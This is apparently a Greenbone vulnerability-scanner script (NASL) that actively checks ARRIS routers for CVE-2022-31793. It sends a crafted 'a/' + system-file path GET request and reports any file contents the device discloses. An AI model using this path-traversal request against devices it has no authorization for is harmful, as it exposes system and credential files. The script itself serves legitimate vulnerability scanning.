# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:arris:";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148592");
  script_version("2022-08-16T10:20:04+0000");
  script_tag(name:"last_modification", value:"2022-08-16 10:20:04 +0000 (Tue, 16 Aug 2022)");
  script_tag(name:"creation_date", value:"2022-08-12 07:09:13 +0000 (Fri, 12 Aug 2022)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2022-31793");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ARRIS Routers Information Disclosure Vulnerability (Jun 2022) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_arris_router_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("arris/router/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Multiple ARRIS routers are prone to an information disclosure
  vulnerability in the underlying muhttpd web server.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"do_request in request.c in muhttpd before 1.1.7 allows remote
  attackers to read arbitrary files by constructing a URL with a single character before a desired
  path on the filesystem. This occurs because the code skips over the first character when serving
  files.");

  script_tag(name:"affected", value:"Arris NVG443, NVG599, NVG589, and NVG510 devices and
  Arris-derived BGW210 and BGW320 devices. Other devices might be affected as well.");

  script_tag(name:"solution", value:"Contact your vendor/ISP for a solution.");

  script_xref(name:"URL", value:"https://derekabdine.com/blog/2022-arris-advisory");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www", first_cpe_only: TRUE))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

foreach pattern (keys(files)) {
  url = "a/" + files[pattern];

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(pattern: pattern, string: res)) {
    info['HTTP Method'] = "GET";
    info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to obtain the file "' + files[pattern] + '".';
    report += '\n\nResult:\n\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(99);
